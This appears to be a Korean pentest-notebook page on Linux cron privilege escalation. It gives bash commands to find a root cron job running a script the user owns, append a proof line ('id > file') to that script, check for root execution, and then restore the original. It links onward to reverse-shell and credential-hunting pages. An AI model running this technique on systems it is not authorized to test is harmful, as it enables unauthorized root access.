---
tags:
  - 환경/linux
시작조건: ["Linux shell", "고권한 cron이 실행하는 POSIX shell script 경로 확인"]
필요권한: ["현재 계정이 소유한 cron 호출 script 쓰기 권한"]
필요조건: ["cron 실행 사용자와 주기 확인", "현재 계정 소유 POSIX shell script", "원본과 metadata backup", "현재 계정 소유 proof parent directory"]
결과: ["고권한 명령 실행"]
---

# Cron 권한 상승

## 한 줄 판단

현재 Linux 셸의 계정이 소유하고 쓰는 POSIX shell script를 root 또는 다른 고권한 계정의 cron이 주기적으로 실행한다면, 원본과 metadata를 보존하고 다음 실행 때 삽입한 고유 proof 명령이 그 계정으로 실행되는지 확인한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| cron 항목 | 주기·실행 사용자·실제 command path가 확인됨 | `/etc/crontab`, `/etc/cron.d`, 현재 사용자의 `crontab -l`을 읽고 command path를 추적 | systemd timer나 애플리케이션 scheduler인지 별도 확인 |
| 제어 지점 | 현재 계정이 cron이 실제로 읽는 script 또는 그 교체 가능한 상위 directory를 제어함 | `namei -l`, `stat`, `test -w` | 단순히 같은 이름의 파일이나 directory를 쓸 수 있다는 이유로 진행하지 않음 |
| script 형식 | 아래 대표 절차는 POSIX shell 문법으로 실행되는 기존 script | shebang과 cron command의 interpreter를 확인 | Python·PowerShell·binary·직접 command라면 이 삽입 명령을 쓰지 않고 해당 형식의 저영향 proof와 별도 복구를 설계 |
| 실행 확인 | 한 번의 schedule interval과 실행 주체를 확인할 수 있음 | cron 항목의 표현식·사용자 필드, journal 또는 고유 proof file | 실행 주기·시간대가 불명확하면 파일을 변경하지 않음 |
| 복구 권한·정보 | 대표 절차에서는 현재 계정이 script owner여서 원본 내용과 mtime을 직접 복원할 수 있고, mode·owner·ACL·xattr 기준선을 보존할 수 있음 | `test -O`, 고유 backup directory와 작업 전 metadata | group/ACL 쓰기만 있고 mtime 복원 권한이나 연결이 보장된 고권한 정리 경로가 없으면 변경하지 않음 |

## 실행
### cron 확인

이 블록은 대상 Linux 호스트의 현재 셸에서 실행한다. `<TARGET_SCRIPT>`는 cron 항목이 실제로 호출하는 절대 script 경로(가상 예: `/opt/backup/run.sh`)이며, 같은 이름의 다른 파일이나 symbolic link를 대체하지 않는다.

```bash
cat /etc/crontab
ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily 2>/dev/null
crontab -l 2>/dev/null
namei -l '<TARGET_SCRIPT>'
head -n 1 -- '<TARGET_SCRIPT>'
stat -c '%U:%G %a %y %n' -- '<TARGET_SCRIPT>'
test -f '<TARGET_SCRIPT>' && test -w '<TARGET_SCRIPT>' && test -O '<TARGET_SCRIPT>'
```

확인할 출력:

- cron이 실제로 호출하는 `<TARGET_SCRIPT>`, 실행 사용자, 주기와 현재 계정의 정확한 제어 지점.
- `/etc/crontab`과 `/etc/cron.d`에는 사용자 필드가 있지만 사용자 crontab에는 별도 사용자 필드가 없다. 파일을 발견했다는 사실만으로 root 실행을 단정하지 않는다.
- `test`가 성공해도 cron이 다른 path·copy·interpreter를 실행한다면 제어 지점이 아니므로 command path를 끝까지 확인한다.

### 저영향 proof 명령으로 실행 주체 확인

먼저 현재 사용자가 소유하고 삭제할 수 있는 directory 아래에서 공백과 shell metacharacter가 없는 고유한 `<CRON_PROOF_PATH>`를 정한다. `<CURRENT_USER_OWNED_DIRECTORY>`는 대상 Linux 호스트에서 현재 계정이 소유한 절대 디렉터리(가상 예: `/tmp/alice-proof`)이고 `<UNIQUE_ID>`는 이번 실행을 구별하는 짧은 문자열(가상 예: `20260914a`)이다. 그 뒤 원본과 metadata를 고유 backup directory에 보존한다. 이 변수 값과 출력은 현재 terminal에만 두고 Vault에 작업 기록을 저장하지 않는다.

```bash
TARGET_SCRIPT='<TARGET_SCRIPT>'
CRON_BACKUP_DIR="$(mktemp -d /tmp/cron-audit.XXXXXX)"
CRON_BACKUP_FILE="$CRON_BACKUP_DIR/original"
CRON_PROOF_PARENT='<CURRENT_USER_OWNED_DIRECTORY>'
CRON_PROOF_PATH="$CRON_PROOF_PARENT/cron-proof-<UNIQUE_ID>"

test -f "$TARGET_SCRIPT" && test -w "$TARGET_SCRIPT" && test -O "$TARGET_SCRIPT"
test -d "$CRON_PROOF_PARENT" && test -O "$CRON_PROOF_PARENT" && test -w "$CRON_PROOF_PARENT"
test ! -e "$CRON_PROOF_PATH"
cp --preserve=mode,timestamps -- "$TARGET_SCRIPT" "$CRON_BACKUP_FILE"
sha256sum -- "$TARGET_SCRIPT" "$CRON_BACKUP_FILE"
stat -c '%U:%G %a %y %n' -- "$TARGET_SCRIPT" > "$CRON_BACKUP_DIR/stat.before"
if command -v getfacl >/dev/null; then getfacl -p -- "$TARGET_SCRIPT" > "$CRON_BACKUP_DIR/acl.before"; fi
if command -v getfattr >/dev/null; then getfattr -d -m- -- "$TARGET_SCRIPT" > "$CRON_BACKUP_DIR/xattr.before"; fi
```

원본-백업 hash가 같고 `<CRON_PROOF_PATH>`가 없을 때만 한 줄을 추가한다. 이 비교는 복원할 원본과 작업 중 script가 같은지 판단하므로 유지한다. 이 예시는 고권한 명령 실행만 검증하며 shell 획득을 의미하지 않는다.

```bash
printf '\numask 077; id > %s\n' "$CRON_PROOF_PATH" >> "$TARGET_SCRIPT"
tail -n 3 -- "$TARGET_SCRIPT"
sha256sum -- "$TARGET_SCRIPT" > "$CRON_BACKUP_DIR/injected.sha256"
```

한 번의 확인된 schedule interval 뒤 proof만 읽는다.

```bash
stat -c '%U:%G %a %y %n' -- "$CRON_PROOF_PATH"
cat -- "$CRON_PROOF_PATH"
```

확인할 출력:

- `uid=0(root)` 또는 cron 항목에서 확인한 고권한 사용자와 일치하는 `id` 출력.
- proof의 owner도 그 실행 주체와 일치해야 한다. 파일이 없거나 owner·내용이 다르면 고권한 실행은 미확정이다.
- callback이 꼭 필요한 후속 단계만 [[Reverse Shell 획득]]에서 별도로 구성한다. 먼저 proof로 실행을 확인하지 않은 채 listener와 payload를 동시에 디버깅하지 않는다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 고유 proof 파일이 root 소유로 생성됨 | 고권한 cron 실행은 성공했으나 interactive shell은 없음 | root 명령 실행 | proof와 원본을 정리한 뒤 [[고권한 세션 확보 후 후속 판단]] |
| script timestamp와 로그가 바뀌지 않음 | 주기 또는 실제 호출 경로가 다름 | 기존 Linux shell 유지 | cron log와 정확한 실행 경로 재확인 |
| script 또는 상위 디렉터리에 쓸 수 없음 | 현재 사용자가 실행 내용을 바꿀 수 없음 | cron 단서만 확보 | 다른 writable script, PATH 또는 별도 권한 상승 기법 확인 |
| script는 바뀌었지만 proof가 없음 | 실제 command path·interpreter·schedule이 다르거나 실행 실패 | 고권한 실행 가능성 미확정 | 원본을 먼저 복원한 뒤 cron log와 정확한 실행 경로 확인 |

## 확인할 출력과 권한

| 확인 지점 | 확인할 출력 | 권한 판단 |
|---|---|---|
| cron 소유자와 실행 사용자 | `/etc/crontab` 사용자 필드, 파일 소유권 | root 또는 다른 고권한 사용자의 작업인지 확인 |
| 쓰기 권한 | `ls -la`, 상위 디렉터리 권한 | script 내용과 경로 중 실제로 제어 가능한 지점 확인 |
| 실행 결과 | proof의 `id`, owner, cron timestamp·log | 고권한 명령 실행만 확정. 대화형 shell과 지속 접근은 별도 상태 |

## 변경 영향과 복구

proof의 성공 여부와 관계없이 확인한 schedule interval이 끝나면 현재 연결된 shell에서 원본을 먼저 복원한다. 복원 직전에 삽입 직후 hash가 그대로인지 확인하여, 다른 변경이 섞였으면 자동으로 덮어쓰지 않는다. `cat`으로 같은 파일 객체의 내용만 되돌리고 `touch --reference`로 원래 mtime을 적용한다. 이 절차는 owner·DACL·xattr를 바꾸지 않지만 ctime, cron·audit log와 이미 실행된 명령의 영향은 되돌릴 수 없다.

첫 `sha256sum -c`가 `OK`일 때만 나머지 복원 명령을 계속한다. 실패하면 다른 변경이 섞인 것이므로 script를 덮어쓰지 않고 backup과 현재 파일을 보존해 수동 병합 대상으로 남긴다.

```bash
if sha256sum -c "$CRON_BACKUP_DIR/injected.sha256"; then
  cat -- "$CRON_BACKUP_FILE" > "$TARGET_SCRIPT"
  touch --reference="$CRON_BACKUP_FILE" -- "$TARGET_SCRIPT"
  sha256sum -- "$TARGET_SCRIPT" "$CRON_BACKUP_FILE"
  cat -- "$CRON_BACKUP_DIR/stat.before"
  stat -c '%U:%G %a %y %n' -- "$TARGET_SCRIPT"
  if test -f "$CRON_BACKUP_DIR/acl.before"; then getfacl -p -- "$TARGET_SCRIPT" > "$CRON_BACKUP_DIR/acl.after" && diff -u "$CRON_BACKUP_DIR/acl.before" "$CRON_BACKUP_DIR/acl.after"; fi
  if test -f "$CRON_BACKUP_DIR/xattr.before"; then getfattr -d -m- -- "$TARGET_SCRIPT" > "$CRON_BACKUP_DIR/xattr.after" && diff -u "$CRON_BACKUP_DIR/xattr.before" "$CRON_BACKUP_DIR/xattr.after"; fi
else
  printf '%s\n' '다른 변경이 감지되어 자동 복원을 중단함' >&2
fi
```

확인할 출력:

- 복원한 script와 backup의 hash가 일치한다.
- `stat`을 `stat.before`와 대조했을 때 owner·mode·mtime이 작업 전 값과 일치하고 ACL·xattr diff가 없어야 한다.
- `getfacl` 또는 `getfattr`가 없어 기준선을 만들지 못했다면 해당 metadata는 `미확인`이며 복구 완료 근거에 포함하지 않는다.
- hash나 metadata가 다르거나 복원 중 동시 변경이 의심되면 backup을 삭제하지 않고 복구 미완료로 남긴다. 다른 변경을 backup으로 덮어쓰지 않는다.

복원이 확인된 뒤 이번 작업에서 만든 proof와 backup 파일만 제거한다. proof는 현재 사용자가 소유하고 쓸 수 있는 parent directory를 골랐으므로 파일 owner가 root여도 그 exact entry를 제거할 수 있어야 한다.

```bash
rm -f -- "$CRON_PROOF_PATH"
rm -f -- "$CRON_BACKUP_DIR/stat.before" "$CRON_BACKUP_DIR/acl.before" "$CRON_BACKUP_DIR/xattr.before" "$CRON_BACKUP_DIR/injected.sha256"
rm -f -- "$CRON_BACKUP_DIR/acl.after" "$CRON_BACKUP_DIR/xattr.after" "$CRON_BACKUP_FILE"
rmdir -- "$CRON_BACKUP_DIR"
test ! -e "$CRON_PROOF_PATH" && test ! -e "$CRON_BACKUP_DIR"
```

마지막 `test`가 성공해야 생성 자원 정리가 끝난 것이다. proof parent에 대한 삭제 권한이 없거나 cron이 다시 실행되어 proof를 재생성하면 script 복원 여부와 실행 주기를 먼저 확인한다. 이름이 비슷한 `/tmp/cron-*` 파일이나 다른 프로세스를 일괄 삭제·종료하지 않는다.

## 후속 공격 연결

- [[Reverse Shell 획득]]
- [[Linux 파일 자격증명 검색]]
- [[Linux Shell History 자격증명 검색]]
- [[Linux 개인키 검색]]

## 관련 상태 라우터

- root 셸 또는 root 명령 실행 확인: [[고권한 세션 확보 후 후속 판단]]
- cron 후보만 남거나 일반 사용자 셸 유지: [[Linux 셸 확보 후 초기 열거와 권한 상승]]

## 관련 도구

- [[linpeas]]

## 참고 링크

- [crontab(5) — crontab 형식과 system crontab의 사용자 필드](https://man7.org/linux/man-pages/man5/crontab.5.html)
